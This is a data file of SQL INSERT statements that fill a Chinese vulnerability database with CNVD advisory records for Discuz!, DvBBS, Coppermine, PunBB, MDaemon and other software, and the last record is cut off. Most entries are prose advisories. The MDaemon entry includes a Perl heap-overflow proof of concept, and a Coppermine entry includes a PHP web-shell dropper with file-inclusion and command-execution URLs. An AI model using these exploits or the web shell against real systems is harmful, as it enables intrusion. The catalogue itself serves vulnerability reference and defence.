------------------------
------------------------
------------------------
------------------------
------------------------
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Discuz! $_DCACHE数组变量覆盖漏洞', 'CNVD-2008-5553', '2008-11-14', '高', 'Comsenz Discuz!  ', '', '', 'Discuz!是一款华人地区非常流行的Web论坛程序。      由于Discuz!的wap\index.php调用Chinese类里Convert方法在处理post数据时错误的忽视对数组的处理，可能导致数组被覆盖为NULL。当覆盖$_DCACHE时就可能导致跨站脚本、SQL注入、代码执行等严重的安全问题。      以下是/wap/index.php中的漏洞代码段：      //43行   $chs = \'\';   if($_POST &amp;&amp; $charset != \'utf-8\') {   $chs = new Chinese(\'UTF-8\', $charset);   foreach($_POST as $key =&gt; $value) {   $$key = addslashes(stripslashes($chs-&gt;Convert($$key)));   }   unset($chs);   }   ...   if(in_array($action, array(\'home\', \'login\', \'register\', \'search\', \'stats\', \'my\', \'myphone\', \'goto\', \'forum\', \'thread\', \'post\'))) {   require_once \'./include/\'.$action.\'.inc.php\';      这个地方是对非utf-8编码下的数据进行编码转换，但Convert方法存在一个问题，如果存在iconv()将会用此函数进行编码转换，这时如果传递进来的参数是一个数组，将会返回FALSE。如果POST提交一个_DCACHE=1，经过Convert()处理$_DCACHE就会被覆盖为NULL，再经过stripslashes()或者addslashes()处理会被覆盖为一个空的字符串。      /wap/include/register.inc.php      //124行   require_once DISCUZ_ROOT.\'./include/cache.func.php\';   $_DCACHE[\'settings\'][\'totalmembers\']++;   $_DCACHE[\'settings\'][\'lastmember\'] = $discuz_userss;   updatesettings();      这里是注册用户后更新缓存数据，在updatesettings()中如下处理：      include/cache.func.php      //252行   function updatesettings() {   global $_DCACHE;   if(isset($_DCACHE[\'settings\']) &amp;&amp; is_array($_DCACHE[\'settings\'])) {   writetocache(\'settings\', \'\', \'$_DCACHE[\\'settings\\'] = \'.arrayeval($_DCACHE[\'settings\']).&quot;;\n\n&quot;);   }   }      可以看到这里写入的是$GLOBALS[_DCACHE]，我们可以在注册时用上面提到的方法把$_DCACHE覆盖为一个空字符串，然后经过上面代码的重新赋值及更新缓存，最后写入forumdata/cache/cache_settings.php的将只有$_DCACHE[\'settings\'][\'totalmembers\']和$_DCACHE[\'settings\'][\'lastmember\']。      include/common.inc.php      //95行   $cachelost = (@include DISCUZ_ROOT.\'./forumdata/cache/cache_settings.php\') ? \'\' : \'settings\';   @extract($_DCACHE[\'settings\']);   ...   $styleid = intval(!empty($_GET[\'styleid\']) ? $_GET[\'styleid\'] :   (!empty($_POST[\'styleid\']) ? $_POST[\'styleid\'] :   (!empty($_DSESSION[\'styleid\']) ? $_DSESSION[\'styleid\'] :   $_DCACHE[\'settings\'][\'styleid\'])));      $styleid = intval(isset($stylejump[$styleid]) ? $styleid : $_DCACHE[\'settings\'][\'styleid\']);      if(@!include DISCUZ_ROOT.\'./forumdata/cache/style_\'.intval(!empty($forum[\'styleid\']) ? $forum[\'styleid\'] : $styleid).\'.php\') {   $cachelost .= (@include DISCUZ_ROOT.\'./forumdata/cache/style_\'.($styleid = $_DCACHE[\'settings\'][\'styleid\']).\'.php\') ? \'\' : \' style_\'.$styleid;   }      这里用extract处理了$_DCACHE[\'settings\']，但由于此时包含的forumdata/cache/cache_settings.php文件中仅存在$_DCACHE[\'settings\'][\'totalmembers\']和$_DCACHE[\'settings\'][\'lastmember\']，将导致大量的变量没有初始化，而此部分变量在整个程序中起到了重要作用。攻击者可以随意提交这些变量，导致跨站脚本、sql注入、命令执行等严重的安全问题。      请注意$styleid可能会导致重新更新缓存文件，可以提交stylejump[1]=1&amp;styleid=1&amp;inajax=1，这样就不会再次更新缓存，forumdata/cache/cache_settings.php里依然是wap注册时写入的数据。', '', 'Discuz!  -------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.discuz.net/', '(无补丁信息)', '已验证', '2008-11-14', '2008-11-14', '2008-11-14', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Plug and Play Web Server远程目录遍历漏洞', 'CNVD-2003-2900', '2003-09-18', '高', '(暂无)', '', '', 'Plug and Play Web服务程序是一套维护站点的工具。      Plug and Play Web服务程序没有充分过滤用户提交的请求，远程攻击者可以利用这个漏洞以WEB权限在系统上查看任意文件内容。      攻击者提交包含\'../\'或者\'..\\'的URL请求，可导致绕过WEB ROOT文件目录限制，以WEB进程权限在系统上查看任意文件内容。', '', 'Plug and Play  -------------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.pandpsoftware.com/index.htm', '(无补丁信息)', '已验证', '2003-09-18', '2003-09-18', '2003-09-23', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('动网论坛preview.php页面远程代码执行漏洞', 'CNVD-2010-2104', '2010-09-24', '低', 'Dvbbs php 2.0++', '', '', 'DvBBS是一款国内流行的WEB论坛程序。DvBBS存在输入验证错误，远程攻击者可以利用漏洞进行SQL注入攻击。在文件preview.php中：require printout(\'preview\');  //第9行&hellip;&hellip;函数printout在文件inc/ dv_clsmain.php中：function printout($template,$ext=&quot;tpl.php&quot;){  //第464行文件最后包含了templates\default\ preview.tpl.php文件&hellip;&hellip;在文件templates\default\ preview.tpl.php中：$theBody =&amp; Dv_CodeProcess($theBody, $tmpuserinfo, Ubblist($theBody).\'39,\', 1, 0); //第31行&amp; Dv_CodeProcess函数在文件inc/dv_code.php文件中：function &amp;Dv_CodeProcess(&amp;$code,&amp;$currUserInfo,$ubblists,$PostType=1,$sType=1) //第332行&hellip;&hellip;$arrPattern[] = \'#\[url\s\*=\s\*([^\]]+)](.\*?)\[img](.+?)\[\/img](.\*?)\[/url]#iesm\';   //第415行$arrRepl[] = \'\\'&lt;a href=&quot;\\'.str_filter_xss(&quot;$1&quot;).\\'&quot; target=&quot;_blank&quot;&gt;$2&lt;img src=&quot;\\'.str_filter_xss(&quot;$3&quot;).\\'&quot; border=&quot;0&quot;/ &gt;$4&lt;/a&gt;\\'\';&hellip;&hellip;$returnval = preg_replace( $arrPattern ,$arrRepl ,$code );  //第861行函数preg_replace当第一个参数的正则表达式有e符号的时候，第二个参数的字符串当做PHP代码执行。', 'http://sebug.net/vulndb/20070/', '目前没有详细解决方案提供：http://www.dvbbs.net/', '(无补丁信息)', '(暂无验证信息)', '2010-09-24', '2010-09-24', '2010-09-24', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('多种压缩工具处理路径名不正确漏洞', 'CNVD-2013-15405', '2002-12-17', '中   (AV:N/AC:L/Au:N/C:P/I:N/A:N)', '(暂无)', '6412', '', '多个压缩工具存在安全问题。多个压缩工具在解压.tar压缩档时不正确处理路径名，远程攻击者可以利用这个漏洞诱骗用户解压包含恶意路径名的文件到其他目录中。多种压缩工具如cpio、Winzip、PKZip、WinRar、SpeedCommander、Squeez、ZipMagic在处理.tar文件时存在目录遍历漏洞，在解压.tar文件时，如果某一文件的路径名字符串包含\'/\'字符，大多数程序在解压的时候可以正确剔除，但是它们没有充分检查包含\'../\'字符的路径名，在解压的时候就可以把类似的文件存放到原用户指定目录之外的位置上，通过诱使用户把恶意文件解压到任意目录，就可以导致以高权限覆盖系统任意文件，或覆盖到远程可访问目录，造成任意代码可远程执行等恶意操作。另外Windows平台下对\'..\\'字符缺少过滤，也可以导致目录遍历攻击。', 'http://marc.theaimsgroup.com/?l=bugtraq&amp;m=104014708001123&amp;w=2', '目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：RARLAB Upgrade WinRAR 3.10 beta 5http://www.rarlabs.com/rar/wrar31b5.exeWinZip------目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：WinZip Upgrade WinZip 8.1 SR-1http://www.winzip.com/wz81sr1.htm', '多种压缩工具处理路径名不正确漏洞的补丁', '(暂无验证信息)', '2013-03-14', '2013-12-20', '2013-12-20', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CNVD-2002-3775', 'CNVD-2002-3775', '2002-10-04', '低', '(暂无)', '', '', 'Abyss Web Server是一款由Aprelium Technologies开发和维护的Web服务器。Abyss Web Server实现上存在输入验证漏洞，远程攻击者可以利用此漏洞进行目录遍历攻击，读取任意有权限读取的文件。Abyss Web Server没有正确检查反斜杠\'\\'(编码为\'%5c\')，远程攻击者可能利用URL编码\'%2e%2e%5c\'来进行目录遍历攻击，任意系统文件可能被攻击者读取。在不同的环境，得到效果不同。', 'ttp://www.iss.net/security_center/static/9941.ph  ttp://www.iss.net/security_center/static/9940.ph', '', '(无补丁信息)', '(暂无验证信息)', '2002-10-04', '2002-10-04', '2002-10-04', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CNVD-2006-6525', 'CNVD-2006-6525', '2006-08-25', '高', '(暂无)', '', '', '危害远程攻击者可以利用漏洞可能以进程权限执行任意指令。攻击所需条件攻击者必须访问Alt-N MDaemon。漏洞信息Alt-N MDaemon是一款流行的邮件服务程序。Alt-N MDaemon POP3服务存在多个预验证缓冲区溢出，远程攻击者可以利用漏洞可能以进程权限执行任意指令。问题存在于Altn MDaemon POP3服务处理\'USER\'和\'APOP\'命令存在缓冲区溢出，攻击者可以通过使用包含\'@\'字符的超长字符串作为命令参数，可导致系统崩溃，精心构建提交数据可能以进程权限执行任意指令，此漏洞无需验证就可以触发。测试方法# PoC for Mdaemon POP3 preauth heap overflow## Coded by Leon Juranic &amp;lt;leon.juranic@infigo.hr&gt;# Infigo IS &amp;lt;http://www.infigo.hr&gt;# #$host = \'192.168.0.105\';use IO::Socket;for ($x = 0 ; $x &amp;lt; 12 ; $x++){$sock = new IO::Socket::INET (PeerAddr =&gt; $host,PeerPort =&gt; \'110\', Proto =&gt; \'tcp\') || die &quot;socket error\n\n&quot;;recv ($sock, $var, 10000,0);print $var;print $sock &quot;USER &quot; . &quot;\@A&quot; x 160 . &quot;  &quot;;recv ($sock, $var, 10000,0);print $var;print $sock &quot;QUIT  &quot;;recv ($sock, $var, 10000,0);print $var;close ($sock);sleep(1);}$sock = new IO::Socket::INET (PeerAddr =&gt; $host,PeerPort =&gt; \'110\', Proto =&gt; \'tcp\') || die &quot;socket error\n\n&quot;;recv ($sock, $var, 10000,0);print $var;print $sock &quot;USER &quot; . &quot;\@A\@A&quot; . &quot;B&quot; x 326 . &quot;  &quot;;recv ($sock, $var, 10000,0);print $var;print $sock &quot;USER &quot; . &quot;\\'A&quot; x  337 . &quot;  &quot;;recv ($sock, $var, 10000,0);print $var;sleep(2);厂商解决方案MDaemon 9.06不存在此漏洞，建议下载使用：http://www.altn.com/', 'http://www.securityfocus.com/archive/1/archive/1/444015/100/0/threaded  http://www.infigo.hr/en/in_focus/advisories/INFIGO-2006-08-04  http://milw0rm.com/exploits/2245  http://files.altn.com/Mdaemon/Release/RelNotes_en.txt  http://www.securityfocus.com/bid/19651  http://www.frsirt.com/english/advisories/2006/3361  http://www.osvdb.org/28125  http://securitytracker.com/id?1016729  http://secunia.com/advisories/21595  http://securityreason.com/securityalert/1446  http://xforce.iss.net/xforce/xfdb/28517', '', '(无补丁信息)', '(暂无验证信息)', '2006-08-25', '2006-08-25', '2006-08-25', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Cyrus SASL库LDAP堆破坏漏洞', 'CNVD-2002-4235', '2002-12-09', '高', '(暂无)', '', '', 'Cyrus SASL库提供多个用于安全认证的函数集。      Cyrus SASL库在处理用户名或域(realm)中包含特殊字符时不充分分配缓冲区，远程攻击者可以利用这个漏洞覆盖堆内存结构，可能以进程权限在系统上执行任意指令。      使用saslauthd的LDAP验证当在用户名和域中包含\'\*\'、\'(\'、\')\'、\'\\'和\'\0\'字符时不充分分配缓冲区，攻击者可以利用这个漏洞覆盖malloc头结构，如果以精心构建的数据覆盖结构地址，可能以当前进程权限在系统上执行任意指令。      此问题在Cyrus上存在，但是其他使用了SASL库的应用程序也可能存在此漏洞。', '', 'Carnegie Mellon University  --------------------------  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载最新版本：      Cyrus Upgrade SASL 2.1.10   ftp://ftp.andrew.cmu.edu/pub/cyrus-mail/cyrus-sasl-2.1.10.tar.gz', '(无补丁信息)', '(暂无验证信息)', '2002-12-09', '2002-12-09', '2002-12-17', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Caucho Technology Resin服务程序view_source.jsp远程文件泄露漏洞', 'CNVD-2002-2887', '2002-06-17', '中', '(暂无)', '', 'CVE-2002-1987', 'Resin是一款由Caucho Technology公司分发的WEB服务器程序，使用于Microsoft Windows操作系统下。      Resin WEB服务程序包含的样例脚本view_source.jsp对用户输入缺少过滤，远程攻击者可以利用此漏洞进行目录遍历攻击。      Resin WEB服务程序中存在样例脚本view_source.jsp，view_source.jsp脚本在解析包含\'/../\'字符的特殊请求进行了过滤，不过攻击者可以通过提交包含\'\..\\'字符的请求进行目录遍历攻击，这样可绕过chroot限制，以WEB进程的权限查看系统上的任意文件内容。', '', 'Caucho Technology  -----------------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.caucho.com/', '(无补丁信息)', '(暂无验证信息)', '2002-06-17', '2002-06-17', '2002-06-17', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Coppermine Photo Gallery远程代码注入漏洞', 'CNVD-2006-0952', '2006-02-18', '高   (AV:N/AC:L/Au:N/C:C/I:C/A:C)', '(暂无)', '16718', '', 'Coppermine是用PHP编写的多用途集成web图形库脚本。 Coppermine存在多个输入验证漏洞，攻击者可能利用这些漏洞在服务器上以Web进程权限在主机上执行任意命令。由于没有正确的过滤用户输入，导致Coppermine中存在多个本地/远程文件包含问题：1、在include/init.inc.php文件308-343行附近的处理lang参数时：...// Process language selection if present in URI or in user profile or try// autodetection if default charset is utf-8if (!empty($_GET[\'lang\'])){    $USER[\'lang\'] = $_GET[\'lang\'];           [!!!!!!!!!!!!!!]}if (isset($USER[\'lang\']) &amp;&amp; !strstr($USER[\'lang\'], \'/\') &amp;&amp; file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\')){    $CONFIG[\'default_lang\'] = $CONFIG[\'lang\'];          // Save default language    $CONFIG[\'lang\'] = strtr($USER[\'lang\'], \'$/\\:\*?&quot;\\'&lt;&gt;|`\', \'____________\');}elseif ($CONFIG[\'charset\'] == \'utf-8\'){    include(\'include/select_lang.inc.php\');    if (file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\'))    {        $CONFIG[\'default_lang\'] = $CONFIG[\'lang\'];      // Save default language        $CONFIG[\'lang\'] = $USER[\'lang\']; // [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]    }}else{    unset($USER[\'lang\']);}if (isset($CONFIG[\'default_lang\']) &amp;&amp; ($CONFIG[\'default_lang\']==$CONFIG[\'lang\'])){        unset($CONFIG[\'default_lang\']);}if (!file_exists(&quot;lang/{$CONFIG[\'lang\']}.php&quot;)) [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]  $CONFIG[\'lang\'] = \'english\';// We load the chosen language filerequire &quot;lang/{$CONFIG[\'lang\']}.php&quot;;  [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]...无需登录就可以包含任意本地文件。在[!!!!!]部分代码如下：...$USER[\'lang\'] =  $_GET[\'lang\'];...$CONFIG[\'lang\'] = $USER[\'lang\'];...if (!file_exists(&quot;lang/{$CONFIG[\'lang\']}.php&quot;))  $CONFIG[\'lang\'] = \'english\';...require &quot;lang/{$CONFIG[\'lang\']}.php&quot;;仅需使用&ldquo;../&rdquo;和空字符提供已有文件，上传恶意zip文件。在该文件中假设有以下php代码：&lt;?php     $suntzu=fopen(&quot;shell.php&quot;,&quot;w&quot;);     fputs($suntzu,&quot;&lt;?php system(\$HTTP_GET_VARS[CMD]);?&gt;&quot;);     fclose($suntzu);     chmod(&quot;shell.php&quot;,777);?&gt;现在：http://[target]/[path]/thumbnails.php?lang=../albums/userpics/10002/shell.zip%00这样就可以在目标系统启动命令：http://[target]/[path]/shell.php?CMD=ls%20-la2、在docs/showdoc.php文件21行中的漏洞代码：...if (isset($_REQUEST[\'f\'])) { $file = $_REQUEST[\'f\']; } else { $file = \'\'; }...poc：http://[target]/[path]/docs/showdoc.php?f=c:\boot.ini     http://[target]/[path]/docs/showdoc.php?f=\\192.168.1.2\c\shell.php如果magic_quotes_gpc=on的话，斜线后的&ldquo;c:\\boot.ini&rdquo;就变成了&ldquo;c:\boot.ini&rdquo;，&ldquo;\\\\192.168.1.2\\c\\shell.php&rdquo;变成&ldquo;\\192.168.1.2\c\shell.php&rdquo;。poc 2：http://[target]/[path]/docs/showdoc.php?f=c:\\boot.ini       http://[target]/[path]/docs/showdoc.php?f=\\\\192.168.1.2\\c\\shell.php如果magic_quotes_gpc=off，&ldquo;f&rdquo;变成&ldquo;c:\boot.ini&rdquo;或&ldquo;\\192.168.1.2\c\shell.php&rdquo;，这样攻击者就可以包含本地或外部（Samba）资源。', 'http://marc.theaimsgroup.com/?l=bugtraq&amp;m=114028629810728&amp;w=2', '目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.chezgreg.net/coppermine/', '(无补丁信息)', '已验证', '2013-03-14', '2014-02-18', '2014-02-18', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('PunBB pun_attachment扩展SQL注入漏洞', 'CNVD-2009-5519', '2009-10-29', '中   (AV:N/AC:L/Au:N/C:N/I:P/A:P)', 'pun attachment PunBB 1.0.2', '36865', '', 'PunBB是一款基于PHP的论坛程序。PunBB所使用的pun_attachment扩展中没有正确地过滤对misc.php页面所提交的secure_str参数： if (isset($_GET[\'secure_str\'])){    if (preg_match(\'~(\d+)f(\d+)~\', $_GET[\'secure_str\'], $match))    {    ...            \'WHERE\'        =&gt; \'a.id = \'.$attach_item.\' AND (fp.read_forum IS NULL OR fp.read_forum = 1) AND secure_str = \\'\'.$_GET[\'secure_str\'].\'\\'\'远程攻击者可以通过提交恶意的参数请求执行SQL注入攻击。', 'http://secunia.com/advisories/37174/        http://bbs.wolvez.org/topic/98/', '目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.punbb.org/', '(无补丁信息)', '已验证', '2009-10-27', '2009-10-29', '2009-10-29', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Coppermine Photo Gallery多个SQL注入和本地文件包含漏洞', 'CNVD-2009-2852', '2009-05-18', '高   (AV:N/AC:L/Au:N/C:C/I:N/A:N)', '(暂无)', '35009', '', 'Coppermine是用PHP编写的多用途集成Web图形库脚本。 在Coppermine的/includes/init.inc.php文件的42-65行，远程攻击者可以绕过防register_global保护，执行SQL盲注或本地文件包含攻击：    $keysToSkip = array(\'_POST\', \'_GET\', \'_COOKIE\', \'_REQUEST\', \'_SERVER\', \'HTML_SUBST\', \'keysToSkip\', \'register_globals_flag\', \'cpgdebugger\');        if (ini_get(\'register_globals\') == \'1\' || strtolower(ini_get(\'register_globals\')) == \'on\') {        $register_globals_flag = true;    } else {        $register_globals_flag = false;    }        if (get_magic_quotes_gpc()) {            if (is_array($_POST)) {                    foreach ($_POST as $key =&gt; $value) {                            if (!is_array($value))                                    $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);                            if (!in_array($key, $keysToSkip) &amp;&amp; isset($$key) &amp;&amp; $register_globals_flag) unset($$key);                    }            }                if (is_array($_GET)) {                    foreach ($_GET as $key =&gt; $value) {                            unset($_GET[$key]);                            $_GET[strtr(stripslashes($key), $HTML_SUBST)] = strtr(stripslashes($value), $HTML_SUBST);                            if (!in_array($key, $keysToSkip) &amp;&amp; isset($$key) &amp;&amp; $register_globals_flag) unset($$key);                    }            }$_COOKIE和$_SERVER变量存在同样问题。在magic_quotes_gpc = off时，可绕过保护通过GET或POST请求定义GLOBALS。以下是exploit攻击的方式。在./thumbnails.php文件的79行：    if (isset($_GET[\'sort\'])) $USER[\'sort\'] = $_GET[\'sort\'];    if (isset($_GET[\'cat\'])) $cat = (int)$_GET[\'cat\'];        &lt;== bypass the int cast     if (isset($_GET[\'album\'])) $album = $_GET[\'album\'];    ...    if (is_numeric($album)) {    ...            } else {        $album_set_array = array();        if ($cat == USER_GAL_CAT)                $where = \'category &gt; \' . FIRST_USER_CAT;           else                $where = &quot;category = \'$cat\'&quot;;        $result = cpg_db_query(&quot;SELECT aid FROM {$CONFIG[\'TABLE_ALBUMS\']} WHERE $where&quot;);  &lt;==  Vulnerable query-----------------------------------------------------------------------------------------还可以通过本地文件包含覆盖$USER数组，具体来说是$USER[\'lang\']变量。在/include/functions.inc.php文件的128-135行：    function user_get_profile()    {            global $CONFIG, $USER;            if (isset($_COOKIE[$CONFIG[\'cookie_name\'].\'_data\'])) {                    $USER = @unserialize(@base64_decode($_COOKIE[$CONFIG[\'cookie_name\'].\'_data\']));                    $USER[\'lang\'] = strtr($USER[\'lang\'], \'$/\\:\*?&quot;\\'&lt;&gt;|`\', \'____________\');        &lt;== we bypass it            }              if (!isset($USER[\'ID\']) || strlen($USER[\'ID\']) != 32) {                    list($usec, $sec) = explode(\' \', microtime());                    $seed = (float) $sec + ((float) $usec \* 100000);                    srand($seed);                    $USER=array(\'ID\' =&gt; md5(uniqid(rand(),1)));            } else {                    $USER[\'ID\'] = addslashes($USER[\'ID\']);            }            if (!isset($USER[\'am\'])) $USER[\'am\'] = 1;    }/includes/init.inc.php文件的318-346行：    if (isset($USER[\'lang\']) &amp;&amp; !strstr($USER[\'lang\'], \'/\') &amp;&amp; file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\'))    {            $CONFIG[\'default_lang\'] = $CONFIG[\'lang\'];          // Save default language            $CONFIG[\'lang\'] = strtr($USER[\'lang\'], \'$/\\:\*?&quot;\\'&lt;&gt;|`\', \'____________\');    }    elseif ($CONFIG[\'charset\'] == \'utf-8\')            &lt;== default configuration    {               include(\'include/select_lang.inc.php\');            if (file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\'))            {                    $CONFIG[\'default_lang\'] = $CONFIG[\'lang\'];      // Save default language                    $CONFIG[\'lang\'] = $USER[\'lang\'];            }    }    else    {            unset($USER[\'lang\']);    }    if (isset($CONFIG[\'default_lang\']) &amp;&amp; ($CONFIG[\'default_lang\']==$CONFIG[\'lang\']))    {                unset($CONFIG[\'default_lang\']);    }    if (!file_exists(&quot;lang/{$CONFIG[\'lang\']}.php&quot;))      $CONFIG[\'lang\'] = \'english\';    // We load the chosen language file    require &quot;lang/{$CONFIG[\'lang\']}.php&quot;;        &lt;== vulnerable include-----------------------------------------------------------------------------------------如果启用了注册功能，能够通过口令创建或修改相册的用户可以执行sql盲注。./db_input.php文件：     $event = isset($_POST[\'event\']) ? $_POST[\'event\'] : $_GET[\'event\'];    switch ($event) {     ...    case \'album_update\':        if (!(USER_ADMIN_MODE || GALLERY_ADMIN_MODE)) cpg_die(ERROR, $lang_errors[\'perm_denied\'], __FILE__, __LINE__); &lt;== USER_ADMIN_MODE is TRUE if we are logged in        $aid = (int)$_POST[\'aid\'];        $title = addslashes(trim($_POST[\'title\']));        $category = (int)$_POST[\'category\'];        $description = addslashes(trim($_POST[\'description\']));                $keyword = addslashes(trim($_POST[\'keyword\']));        $thumb = (int)$_POST[\'thumb\'];        $visibility = (int)$_POST[\'visibility\'];        $uploads = $_POST[\'uploads\'] == \'YES\' ? \'YES\' : \'NO\';        $comments = $_POST[\'comments\'] == \'YES\' ? \'YES\' : \'NO\';        $votes = $_POST[\'votes\'] == \'YES\' ? \'YES\' : \'NO\';        $password = $_POST[\'alb_password\'];                    &lt;== this var is not addslashed                $password_hint = addslashes(trim($_POST[\'alb_password_hint\']));        $visibility = !empty($password) ? FIRST_USER_CAT + USER_ID : $visibility;        if (!$title) cpg_die(ERROR, $lang_db_input_php[\'alb_need_title\'], __FILE__, __LINE__);        if (GALLERY_ADMIN_MODE) {            $query = &quot;UPDATE {$CONFIG[\'TABLE_ALBUMS\']} SET title=\'$title\', description=\'$description\', category=\'$category\', thumb=\'$thumb\', uploads=\'$uploads\', comments=\'$comments\', votes=\'$votes\', visibility=\'$visibility\', alb_password=\'$password\', alb_password_hint=\'$password_hint\', keyword=\'$keyword\' WHERE aid=\'$aid\' LIMIT 1&quot;;        } else {            $category = FIRST_USER_CAT + USER_ID;            $query = &quot;UPDATE {$CONFIG[\'TABLE_ALBUMS\']} SET title=\'$title\', description=\'$description\', thumb=\'$thumb\',  comments=\'$comments\', votes=\'$votes\', visibility=\'$visibility\', alb_password=\'$password\',        &lt;== vulnerable query alb_password_hint=\'$password_hint\',keyword=\'$keyword\' WHERE aid=\'$aid\' AND category=\'$category\' LIMIT 1&quot;;        }        $update = cpg_db_query($query);在查询中使用之前没有对$_POST[\'alb_password\']执行addslash操作。init.inc.php中过滤了所有_GET、_POST和_REQUEST变量：     // Do some cleanup in GET, POST and cookie data and un-register global vars    $HTML_SUBST = array(\'&amp;\' =&gt; \'&amp;amp;\', \'&quot;\' =&gt; \'&amp;quot;\', \'&lt;\' =&gt; \'&amp;lt;\', \'&gt;\' =&gt; \'&amp;gt;\', \'%26\' =&gt; \'&amp;amp;\', \'%22\' =&gt; \'&amp;quot;\', \'%3C\' =&gt; \'&amp;lt;\', \'%3E\' =&gt; \'&amp;gt;\',\'%27\' =&gt; \'\'\', &quot;\'&quot; =&gt; \'\'\');     ...    $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);    ...    $_GET[strtr(stripslashes($key), $HTML_SUBST)] = strtr(stripslashes($value), $HTML_SUBST);    ...    $_REQUEST[$key] = strtr(stripslashes($value), $HTML_SUBST);但没有处理反斜线（\），因此可以操作查询在$_POST[\'alb_password\']的默认注入反斜线并在$_POST[\'alb_password_hint\']参数中执行SQL。 ------------------------------------------------------------------------------------------某些配置的Coppermine中还存在一些SQL盲注。在./displayecard.php文件的26-38行：    if (!isset($_GET[\'data\'])) cpg_die(CRITICAL_ERROR, $lang_errors[\'param_missing\'], __FILE__, __LINE__);    $data = array();    $data = @unserialize(@base64_decode($_GET[\'data\']));    // attempt to obtain full link from db if ecard logging enabled and min 12 chars of data is provided and only 1 match    if ((!is_array($data)) &amp;&amp; $CONFIG[\'log_ecards\'] &amp;&amp; (strlen($_GET[\'data\']) &gt; 12)) {            $result = cpg_db_query(&quot;SELECT link FROM {$CONFIG[\'TABLE_ECARDS\']} WHERE link LIKE \'{$_GET[\'data\']}%\'&quot;);            if (mysql_num_rows($result) === 1) {                    $row = mysql_fetch_assoc($result);                    $data = @unserialize(@base64_decode($row[\'link\']));            }    }', 'http://www.milw0rm.com/exploits/8713          http://secunia.com/advisories/35144/', '建议：厂商补丁：Coppermine----------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.chezgreg.net/coppermine/', '(无补丁信息)', '已验证', '2013-03-14', '2014-01-22', '2014-01-22', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('PunBB profile.php脚本用户配置文件编辑模块SQL注入漏洞', 'CNVD-2005-2389', '2005-07-11', '高   (AV:N/AC:L/Au:N/C:C/I:N/A:N)', '(暂无)', '14195', '', 'PunBB是一款基于PHP的论坛程序。PunBB的profile.php用户配置文件模块中存在SQL注入漏洞，远程攻击者可能非授权访问数据库。         // Singlequotes around non-empty values and NULL for ...      while (list($key, $input) = @each($form))       {         $value = ($input !== \'\') ?                       \'\\'\'.$db-&gt;escape($input).\'\\'\' : NULL;         $temp[] = $key.\'=\'.$value;      }                         $db-&gt;query(\'UPDATE \'.$db-&gt;prefix.\'users SET \'.                                          implode(\',\', $temp)...   